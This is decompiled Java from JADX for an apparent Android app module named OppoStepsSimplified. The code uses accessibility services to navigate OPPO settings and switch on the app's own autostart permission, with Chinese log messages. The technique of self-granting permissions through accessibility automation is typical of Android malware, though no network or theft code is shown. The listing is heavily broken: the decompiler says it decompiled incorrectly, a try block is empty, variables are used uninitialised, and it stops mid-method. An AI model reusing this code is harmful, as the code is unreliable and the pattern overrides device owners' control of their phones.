    /* JADX WARN: Can't wrap try/catch for region: R(20:163|268|164|165|166|(1:168)|270|169|(13:263|171|(0)|179|180|274|181|(4:186|187|153|(3:206|207|(4:210|(2:211|(2:213|(2:280|215)(1:281))(1:279))|216|(4:219|220|222|(5:225|226|(2:227|(2:229|(2:277|231)(1:278))(1:276))|232|(2:235|(3:14|238|(7:241|242|(0)(0)|(0)(0)|(3:(0)(0)|(0)(0)|258)(0)|259|260)))))))(0))|190|(1:192)(1:193)|194|207|(0))|178|179|180|274|181|(5:183|186|187|153|(0)(0))|190|(0)(0)|194|207|(0)) */
    /* JADX WARN: Code restructure failed: missing block: B:188:0x05a5, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:195:0x05f8, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:199:0x0600, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:200:0x0601, code lost:
    
        r1 = r1;
        r14 = r14;
     */
    /* JADX WARN: Code restructure failed: missing block: B:201:0x0605, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:202:0x0606, code lost:
    
        r11 = r5;
        r15 = r6;
        r1 = r1;
        r14 = r14;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Not initialized variable reg: 18, insn: 0x00c6: MOVE (r2 I:??[OBJECT, ARRAY]) = (r18 I:??[OBJECT, ARRAY]) (LINE:199), block:B:23:0x00c1 */
    /* JADX WARN: Path cross not found for [B:144:0x0452, B:150:0x0483], limit reached: 272 */
    /* JADX WARN: Path cross not found for [B:150:0x0483, B:144:0x0452], limit reached: 272 */
    /* JADX WARN: Path cross not found for [B:178:0x0566, B:263:0x0553], limit reached: 272 */
    /* JADX WARN: Path cross not found for [B:263:0x0553, B:178:0x0566], limit reached: 272 */
    /* JADX WARN: Removed duplicated region for block: B:101:0x0351  */
    /* JADX WARN: Removed duplicated region for block: B:110:0x0383 A[PHI: r0 r2 r5 r6 r20
      0x0383: PHI (r0v108 int) = (r0v102 int), (r0v109 int) binds: [B:108:0x037f, B:34:0x0135] A[DONT_GENERATE, DONT_INLINE]
      0x0383: PHI (r2v57 java.lang.String) = (r2v54 java.lang.String), (r2v59 java.lang.String) binds: [B:108:0x037f, B:34:0x0135] A[DONT_GENERATE, DONT_INLINE]
      0x0383: PHI (r5v67 boolean) = (r5v65 boolean), (r5v68 boolean) binds: [B:108:0x037f, B:34:0x0135] A[DONT_GENERATE, DONT_INLINE]
      0x0383: PHI (r6v43 com.storm.safe.rock.service.modules.yw5xud.a5) = (r6v41 com.storm.safe.rock.service.modules.yw5xud.a5), (r6v44 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:108:0x037f, B:34:0x0135] A[DONT_GENERATE, DONT_INLINE]
      0x0383: PHI (r20v42 vv) = (r20v40 vv), (r20v43 vv) binds: [B:108:0x037f, B:34:0x0135] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:113:0x039c A[PHI: r0 r2 r5 r6 r20
      0x039c: PHI (r0v110 int) = (r0v108 int), (r0v111 int) binds: [B:111:0x0398, B:33:0x0125] A[DONT_GENERATE, DONT_INLINE]
      0x039c: PHI (r2v60 java.lang.String) = (r2v57 java.lang.String), (r2v62 java.lang.String) binds: [B:111:0x0398, B:33:0x0125] A[DONT_GENERATE, DONT_INLINE]
      0x039c: PHI (r5v69 boolean) = (r5v67 boolean), (r5v70 boolean) binds: [B:111:0x0398, B:33:0x0125] A[DONT_GENERATE, DONT_INLINE]
      0x039c: PHI (r6v45 com.storm.safe.rock.service.modules.yw5xud.a5) = (r6v43 com.storm.safe.rock.service.modules.yw5xud.a5), (r6v46 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:111:0x0398, B:33:0x0125] A[DONT_GENERATE, DONT_INLINE]
      0x039c: PHI (r20v44 vv) = (r20v42 vv), (r20v45 vv) binds: [B:111:0x0398, B:33:0x0125] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:116:0x03ae  */
    /* JADX WARN: Removed duplicated region for block: B:125:0x03ec  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x0415  */
    /* JADX WARN: Removed duplicated region for block: B:136:0x0429  */
    /* JADX WARN: Removed duplicated region for block: B:142:0x044f  */
    /* JADX WARN: Removed duplicated region for block: B:144:0x0452  */
    /* JADX WARN: Removed duplicated region for block: B:14:0x005b A[PHI: r3 r5 r6 r7 r19 r20
      0x005b: PHI (r3v17 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1) = 
      (r3v16 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1)
      (r3v2 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1)
     binds: [B:236:0x0713, B:13:0x0050] A[DONT_GENERATE, DONT_INLINE]
      0x005b: PHI (r5v30 int) = (r5v29 int), (r5v92 int) binds: [B:236:0x0713, B:13:0x0050] A[DONT_GENERATE, DONT_INLINE]
      0x005b: PHI (r6v16 ??) = (r6v15 ??), (r6v57 ??) binds: [B:236:0x0713, B:13:0x0050] A[DONT_GENERATE, DONT_INLINE]
      0x005b: PHI (r7v7 com.storm.safe.rock.service.modules.yw5xud.a5) = (r7v6 com.storm.safe.rock.service.modules.yw5xud.a5), (r7v40 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:236:0x0713, B:13:0x0050] A[DONT_GENERATE, DONT_INLINE]
      0x005b: PHI (r19v15 java.lang.String) = (r19v14 java.lang.String), (r19v0 java.lang.String) binds: [B:236:0x0713, B:13:0x0050] A[DONT_GENERATE, DONT_INLINE]
      0x005b: PHI (r20v14 vv) = (r20v13 vv), (r20v60 vv) binds: [B:236:0x0713, B:13:0x0050] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:152:0x0487  */
    /* JADX WARN: Removed duplicated region for block: B:155:0x04e9  */
    /* JADX WARN: Removed duplicated region for block: B:168:0x054b  */
    /* JADX WARN: Removed duplicated region for block: B:183:0x0571 A[Catch: Exception -> 0x05a5, TryCatch #7 {Exception -> 0x05a5, blocks: (B:181:0x056b, B:183:0x0571, B:186:0x057a, B:190:0x05ab, B:192:0x05d2, B:193:0x05d8), top: B:274:0x056b }] */
    /* JADX WARN: Removed duplicated region for block: B:192:0x05d2 A[Catch: Exception -> 0x05a5, TryCatch #7 {Exception -> 0x05a5, blocks: (B:181:0x056b, B:183:0x0571, B:186:0x057a, B:190:0x05ab, B:192:0x05d2, B:193:0x05d8), top: B:274:0x056b }] */
    /* JADX WARN: Removed duplicated region for block: B:193:0x05d8 A[Catch: Exception -> 0x05a5, TRY_LEAVE, TryCatch #7 {Exception -> 0x05a5, blocks: (B:181:0x056b, B:183:0x0571, B:186:0x057a, B:190:0x05ab, B:192:0x05d2, B:193:0x05d8), top: B:274:0x056b }] */
    /* JADX WARN: Removed duplicated region for block: B:206:0x0637  */
    /* JADX WARN: Removed duplicated region for block: B:210:0x0655 A[PHI: r1 r3 r5 r14 r19 r20 r24 r25
      0x0655: PHI (r1v21 com.storm.safe.rock.service.modules.yw5xud.a5) = (r1v59 com.storm.safe.rock.service.modules.yw5xud.a5), (r1v58 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r3v12 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1) = 
      (r3v3 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1)
      (r3v2 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1)
     binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r5v21 int) = (r5v1 int), (r5v88 int) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r14v10 int) = (r14v36 int), (r14v34 int) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r19v10 java.lang.String) = (r19v1 java.lang.String), (r19v0 java.lang.String) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r20v9 vv) = (r20v0 vv), (r20v56 vv) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r24v11 java.lang.String) = (r24v1 java.lang.String), (r24v19 java.lang.String) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0655: PHI (r25v12 java.lang.String) = (r25v1 java.lang.String), (r25v20 java.lang.String) binds: [B:208:0x0651, B:18:0x0090] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:213:0x0667  */
    /* JADX WARN: Removed duplicated region for block: B:219:0x068c  */
    /* JADX WARN: Removed duplicated region for block: B:221:0x0692  */
    /* JADX WARN: Removed duplicated region for block: B:225:0x06b4  */
    /* JADX WARN: Removed duplicated region for block: B:229:0x06d7  */
    /* JADX WARN: Removed duplicated region for block: B:235:0x06fe A[PHI: r3 r5 r6 r7 r19 r20
      0x06fe: PHI (r3v16 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1) = 
      (r3v15 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1)
      (r3v2 com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$e$1)
     binds: [B:233:0x06fb, B:15:0x005f] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r5v29 int) = (r5v27 int), (r5v91 int) binds: [B:233:0x06fb, B:15:0x005f] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r6v15 ??) = (r6v14 ??), (r6v56 ??) binds: [B:233:0x06fb, B:15:0x005f] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r7v6 com.storm.safe.rock.service.modules.yw5xud.a5) = (r7v5 com.storm.safe.rock.service.modules.yw5xud.a5), (r7v39 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:233:0x06fb, B:15:0x005f] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r19v14 java.lang.String) = (r19v13 java.lang.String), (r19v0 java.lang.String) binds: [B:233:0x06fb, B:15:0x005f] A[DONT_GENERATE, DONT_INLINE]
      0x06fe: PHI (r20v13 vv) = (r20v12 vv), (r20v59 vv) binds: [B:233:0x06fb, B:15:0x005f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:241:0x0727  */
    /* JADX WARN: Removed duplicated region for block: B:244:0x072d  */
    /* JADX WARN: Removed duplicated region for block: B:245:0x0738  */
    /* JADX WARN: Removed duplicated region for block: B:247:0x0742  */
    /* JADX WARN: Removed duplicated region for block: B:248:0x074d  */
    /* JADX WARN: Removed duplicated region for block: B:250:0x0757 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:252:0x0764  */
    /* JADX WARN: Removed duplicated region for block: B:253:0x0766  */
    /* JADX WARN: Removed duplicated region for block: B:254:0x0768  */
    /* JADX WARN: Removed duplicated region for block: B:256:0x076b  */
    /* JADX WARN: Removed duplicated region for block: B:257:0x076d  */
    /* JADX WARN: Removed duplicated region for block: B:263:0x0553 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:276:0x06eb A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:279:0x0678 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:285:0x043a A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:288:0x03ff A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:291:0x034f A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:60:0x0245 A[PHI: r0 r2 r5 r20
      0x0245: PHI (r0v80 int) = (r0v78 int), (r0v81 int) binds: [B:58:0x0241, B:45:0x01dd] A[DONT_GENERATE, DONT_INLINE]
      0x0245: PHI (r2v24 java.lang.String) = (r2v21 java.lang.String), (r2v26 java.lang.String) binds: [B:58:0x0241, B:45:0x01dd] A[DONT_GENERATE, DONT_INLINE]
      0x0245: PHI (r5v44 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v42 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v45 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:58:0x0241, B:45:0x01dd] A[DONT_GENERATE, DONT_INLINE]
      0x0245: PHI (r20v20 vv) = (r20v18 vv), (r20v21 vv) binds: [B:58:0x0241, B:45:0x01dd] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0256 A[PHI: r0 r2 r5 r6 r20
      0x0256: PHI (r0v82 int) = (r0v80 int), (r0v83 int) binds: [B:61:0x0252, B:44:0x01cd] A[DONT_GENERATE, DONT_INLINE]
      0x0256: PHI (r2v27 java.lang.String) = (r2v24 java.lang.String), (r2v29 java.lang.String) binds: [B:61:0x0252, B:44:0x01cd] A[DONT_GENERATE, DONT_INLINE]
      0x0256: PHI (r5v46 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v44 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v47 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:61:0x0252, B:44:0x01cd] A[DONT_GENERATE, DONT_INLINE]
      0x0256: PHI (r6v22 long) = (r6v21 long), (r6v23 long) binds: [B:61:0x0252, B:44:0x01cd] A[DONT_GENERATE, DONT_INLINE]
      0x0256: PHI (r20v22 vv) = (r20v20 vv), (r20v23 vv) binds: [B:61:0x0252, B:44:0x01cd] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:66:0x026a A[PHI: r0 r2 r5 r20
      0x026a: PHI (r0v84 int) = (r0v82 int), (r0v85 int) binds: [B:64:0x0266, B:43:0x01bf] A[DONT_GENERATE, DONT_INLINE]
      0x026a: PHI (r2v30 java.lang.String) = (r2v27 java.lang.String), (r2v32 java.lang.String) binds: [B:64:0x0266, B:43:0x01bf] A[DONT_GENERATE, DONT_INLINE]
      0x026a: PHI (r5v48 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v46 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:64:0x0266, B:43:0x01bf] A[DONT_GENERATE, DONT_INLINE]
      0x026a: PHI (r20v24 vv) = (r20v22 vv), (r20v25 vv) binds: [B:64:0x0266, B:43:0x01bf] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:69:0x027c A[PHI: r0 r2 r5 r20
      0x027c: PHI (r0v86 int) = (r0v84 int), (r0v87 int) binds: [B:67:0x0278, B:42:0x01b1] A[DONT_GENERATE, DONT_INLINE]
      0x027c: PHI (r2v33 java.lang.String) = (r2v30 java.lang.String), (r2v35 java.lang.String) binds: [B:67:0x0278, B:42:0x01b1] A[DONT_GENERATE, DONT_INLINE]
      0x027c: PHI (r5v50 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v48 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:67:0x0278, B:42:0x01b1] A[DONT_GENERATE, DONT_INLINE]
      0x027c: PHI (r20v26 vv) = (r20v24 vv), (r20v27 vv) binds: [B:67:0x0278, B:42:0x01b1] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:72:0x0291 A[PHI: r0 r2 r5 r20
      0x0291: PHI (r0v88 int) = (r0v86 int), (r0v89 int) binds: [B:70:0x028d, B:41:0x01a3] A[DONT_GENERATE, DONT_INLINE]
      0x0291: PHI (r2v36 java.lang.String) = (r2v33 java.lang.String), (r2v38 java.lang.String) binds: [B:70:0x028d, B:41:0x01a3] A[DONT_GENERATE, DONT_INLINE]
      0x0291: PHI (r5v52 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v50 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:70:0x028d, B:41:0x01a3] A[DONT_GENERATE, DONT_INLINE]
      0x0291: PHI (r20v28 vv) = (r20v26 vv), (r20v29 vv) binds: [B:70:0x028d, B:41:0x01a3] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x02a2 A[PHI: r0 r2 r5 r20
      0x02a2: PHI (r0v90 int) = (r0v88 int), (r0v91 int) binds: [B:73:0x029e, B:40:0x0195] A[DONT_GENERATE, DONT_INLINE]
      0x02a2: PHI (r2v39 java.lang.String) = (r2v36 java.lang.String), (r2v41 java.lang.String) binds: [B:73:0x029e, B:40:0x0195] A[DONT_GENERATE, DONT_INLINE]
      0x02a2: PHI (r5v54 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v52 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v56 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:73:0x029e, B:40:0x0195] A[DONT_GENERATE, DONT_INLINE]
      0x02a2: PHI (r20v30 vv) = (r20v28 vv), (r20v31 vv) binds: [B:73:0x029e, B:40:0x0195] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x02ac  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:81:0x02c9  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x02e0 A[PHI: r0 r2 r5 r6 r20
      0x02e0: PHI (r0v94 int) = (r0v92 int), (r0v95 int) binds: [B:83:0x02dc, B:38:0x0175] A[DONT_GENERATE, DONT_INLINE]
      0x02e0: PHI (r2v45 java.lang.String) = (r2v42 java.lang.String), (r2v47 java.lang.String) binds: [B:83:0x02dc, B:38:0x0175] A[DONT_GENERATE, DONT_INLINE]
      0x02e0: PHI (r5v59 boolean) = (r5v57 boolean), (r5v60 boolean) binds: [B:83:0x02dc, B:38:0x0175] A[DONT_GENERATE, DONT_INLINE]
      0x02e0: PHI (r6v35 com.storm.safe.rock.service.modules.yw5xud.a5) = (r6v33 com.storm.safe.rock.service.modules.yw5xud.a5), (r6v36 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:83:0x02dc, B:38:0x0175] A[DONT_GENERATE, DONT_INLINE]
      0x02e0: PHI (r20v34 vv) = (r20v32 vv), (r20v35 vv) binds: [B:83:0x02dc, B:38:0x0175] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x02f2 A[PHI: r0 r2 r5 r6 r20
      0x02f2: PHI (r0v96 int) = (r0v94 int), (r0v97 int) binds: [B:86:0x02ee, B:37:0x0165] A[DONT_GENERATE, DONT_INLINE]
      0x02f2: PHI (r2v48 java.lang.String) = (r2v45 java.lang.String), (r2v50 java.lang.String) binds: [B:86:0x02ee, B:37:0x0165] A[DONT_GENERATE, DONT_INLINE]
      0x02f2: PHI (r5v61 boolean) = (r5v59 boolean), (r5v62 boolean) binds: [B:86:0x02ee, B:37:0x0165] A[DONT_GENERATE, DONT_INLINE]
      0x02f2: PHI (r6v37 com.storm.safe.rock.service.modules.yw5xud.a5) = (r6v35 com.storm.safe.rock.service.modules.yw5xud.a5), (r6v38 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:86:0x02ee, B:37:0x0165] A[DONT_GENERATE, DONT_INLINE]
      0x02f2: PHI (r20v36 vv) = (r20v34 vv), (r20v37 vv) binds: [B:86:0x02ee, B:37:0x0165] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:91:0x0306 A[PHI: r0 r2 r5 r6 r20
      0x0306: PHI (r0v98 int) = (r0v96 int), (r0v99 int) binds: [B:89:0x0302, B:36:0x0155] A[DONT_GENERATE, DONT_INLINE]
      0x0306: PHI (r2v51 java.lang.String) = (r2v48 java.lang.String), (r2v53 java.lang.String) binds: [B:89:0x0302, B:36:0x0155] A[DONT_GENERATE, DONT_INLINE]
      0x0306: PHI (r5v63 boolean) = (r5v61 boolean), (r5v64 boolean) binds: [B:89:0x0302, B:36:0x0155] A[DONT_GENERATE, DONT_INLINE]
      0x0306: PHI (r6v39 com.storm.safe.rock.service.modules.yw5xud.a5) = (r6v37 com.storm.safe.rock.service.modules.yw5xud.a5), (r6v40 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:89:0x0302, B:36:0x0155] A[DONT_GENERATE, DONT_INLINE]
      0x0306: PHI (r20v38 vv) = (r20v36 vv), (r20v39 vv) binds: [B:89:0x0302, B:36:0x0155] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:94:0x031d A[PHI: r0 r2 r5 r6 r20
      0x031d: PHI (r0v100 int) = (r0v98 int), (r0v107 int) binds: [B:92:0x0319, B:35:0x0145] A[DONT_GENERATE, DONT_INLINE]
      0x031d: PHI (r2v54 java.lang.String) = (r2v51 java.lang.String), (r2v56 java.lang.String) binds: [B:92:0x0319, B:35:0x0145] A[DONT_GENERATE, DONT_INLINE]
      0x031d: PHI (r5v65 boolean) = (r5v63 boolean), (r5v66 boolean) binds: [B:92:0x0319, B:35:0x0145] A[DONT_GENERATE, DONT_INLINE]
      0x031d: PHI (r6v41 com.storm.safe.rock.service.modules.yw5xud.a5) = (r6v39 com.storm.safe.rock.service.modules.yw5xud.a5), (r6v42 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:92:0x0319, B:35:0x0145] A[DONT_GENERATE, DONT_INLINE]
      0x031d: PHI (r20v40 vv) = (r20v38 vv), (r20v41 vv) binds: [B:92:0x0319, B:35:0x0145] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x033d  */
    /* JADX WARN: Type inference failed for: r14v9, types: [boolean] */
    /* JADX WARN: Type inference failed for: r1v52 */
    /* JADX WARN: Type inference failed for: r1v60 */
    /* JADX WARN: Type inference failed for: r1v8, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r2v11, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r2v4 */
    /* JADX WARN: Type inference failed for: r2v6 */
    /* JADX WARN: Type inference failed for: r2v7, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r2v83, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r2v85, types: [com.storm.safe.rock.service.modules.yw5xud.a5] */
    /* JADX WARN: Type inference failed for: r2v9 */
    /* JADX WARN: Type inference failed for: r5v93, types: [int] */
    /* JADX WARN: Type inference failed for: r6v13 */
    /* JADX WARN: Type inference failed for: r6v14, types: [int] */
    /* JADX WARN: Type inference failed for: r6v15, types: [int] */
    /* JADX WARN: Type inference failed for: r6v16, types: [int] */
    /* JADX WARN: Type inference failed for: r6v55 */
    /* JADX WARN: Type inference failed for: r6v56, types: [int] */
    /* JADX WARN: Type inference failed for: r6v57, types: [int] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:167:0x0549 -> B:270:0x054d). Please report as a decompilation issue!!! */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212318b6(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$e$1 oppoStepsSimplified$e$1;
        C1351vv c1351vv;
        String str;
        String str2;
        Iterator it;
        Iterator it2;
        C1351vv c1351vv2;
        int i;
        C0368a5 c0368a5;
        Object objM212343e7;
        int i2;
        int i3;
        C1351vv c1351vv3;
        Iterator it3;
        ?? r2;
        int i4;
        Iterator it4;
        int i5;
        String str3;
        ?? r1;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8;
        String string;
        ?? M212320b8;
        int i6;
        C0368a5 c0368a52;
        Iterator it5;
        C0368a5 c0368a53;
        int i7;
        C0368a5 c0368a54;
        int i8;
        int i9;
        ?? r6;
        C0368a5 c0368a55;
        int i10;
        Iterator it6;
        OppoStepsSimplified$e$1 oppoStepsSimplified$e$12;
        C0368a5 c0368a56;
        int i11;
        boolean z;
        boolean z2;
        int i12;
        String str4;
        C0368a5 c0368a57;
        int i13;
        int i14;
        C0368a5 c0368a58;
        long j;
        String strM212334d7;
        boolean zM212319b7;
        C0368a5 c0368a59;
        boolean z3;
        Iterator it7;
        String str5;
        Iterator it8;
        int i15;
        Iterator it9;
        int i16;
        C1351vv c1351vv4 = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$e$1) {
            oppoStepsSimplified$e$1 = (OppoStepsSimplified$e$1) continuationImpl;
            int i17 = oppoStepsSimplified$e$1.f54541a8;
            if ((i17 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$e$1.f54541a8 = i17 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$e$1 = new OppoStepsSimplified$e$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$e$1.f54539a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i18 = oppoStepsSimplified$e$1.f54541a8;
        String str6 = "autostart";
        String str7 = "✅ 开启[";
        String str8 = "autostart";
        try {
        } catch (Exception e) {
            e = e;
            c1351vv = c1351vv4;
            str = "]成功";
            str2 = "✅ 开启[";
            it2 = it;
            i2 = i18;
            c1351vv3 = c1351vv;
            i3 = i5;
            String str9 = "[SafeCenter] ❌ 打开[" + str6 + "]失败: " + e.getMessage();
            c1351vv3.getClass();
            m212303e0(str9);
            i18 = i2;
            str3 = str;
            str7 = str2;
            r1 = c1351vv3;
            i5 = i3;
            if (!it2.hasNext()) {
            }
        }
        switch (i18) {
            case 0:
                c1351vv2 = c1351vv4;
                kg1.m213544f4(obj);
                str4 = str8;
                if (m212336d9(str4)) {
                    m212303e0("⏭️ e()自启动已完成");
                    return c1351vv2;
                }
                StringBuilder sb = new StringBuilder("[e()] pswitch_14 SDK=");
                int i19 = this.f55113a2;
                sb.append(i19);
                m212303e0(sb.toString());
                if (i19 >= 35) {
                    oppoStepsSimplified$e$1.f54533a0 = this;
                    oppoStepsSimplified$e$1.f54536a3 = 0;
                    oppoStepsSimplified$e$1.f54541a8 = 1;
                    if (m212344e8(oppoStepsSimplified$e$1) != coroutineSingletons) {
                        c0368a58 = this;
                        i12 = 0;
                        oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                        oppoStepsSimplified$e$1.f54536a3 = i12;
                        oppoStepsSimplified$e$1.f54541a8 = 2;
                        if (c0368a58.m212314a9("应用", 5, oppoStepsSimplified$e$1) != coroutineSingletons) {
                            oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                            oppoStepsSimplified$e$1.f54536a3 = i12;
                            oppoStepsSimplified$e$1.f54541a8 = 3;
                            j = 300;
                            if (c0368a58.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                c0368a58.m212313a8("自启动#自启动管理");
                                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                                oppoStepsSimplified$e$1.f54536a3 = i12;
                                oppoStepsSimplified$e$1.f54541a8 = 4;
                                if (c0368a58.m212354f9(j, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                    oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                                    oppoStepsSimplified$e$1.f54536a3 = i12;
                                    oppoStepsSimplified$e$1.f54541a8 = 5;
                                    if (c0368a58.m212352f7(3, 1500L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                        strM212334d7 = c0368a58.m212334d7();
                                        oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                                        oppoStepsSimplified$e$1.f54536a3 = i12;
                                        oppoStepsSimplified$e$1.f54541a8 = 6;
                                        if (c0368a58.m212314a9(strM212334d7, 25, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                            oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                                            oppoStepsSimplified$e$1.f54536a3 = i12;
                                            oppoStepsSimplified$e$1.f54541a8 = 7;
                                            if (c0368a58.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                zM212319b7 = c0368a58.m212319b7(c0368a58.m212334d7());
                                                if (zM212319b7) {
                                                    AbstractC0003a2.m46c7("✅ 自启动开关已开启[", c0368a58.m212334d7(), "]");
                                                }
                                                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                                                oppoStepsSimplified$e$1.f54538a5 = zM212319b7;
                                                oppoStepsSimplified$e$1.f54536a3 = i12;
                                                oppoStepsSimplified$e$1.f54541a8 = 8;
                                                if (c0368a58.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                    c0368a59 = c0368a58;
                                                    z3 = zM212319b7;
                                                    oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                    oppoStepsSimplified$e$1.f54538a5 = z3;
                                                    oppoStepsSimplified$e$1.f54536a3 = i12;
                                                    oppoStepsSimplified$e$1.f54541a8 = 9;
                                                    if (c0368a59.m212345e9(oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                        oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                        oppoStepsSimplified$e$1.f54538a5 = z3;
                                                        oppoStepsSimplified$e$1.f54536a3 = i12;
                                                        oppoStepsSimplified$e$1.f54541a8 = 10;
                                                        if (c0368a59.m212343e7(oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                            oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                            oppoStepsSimplified$e$1.f54538a5 = z3;
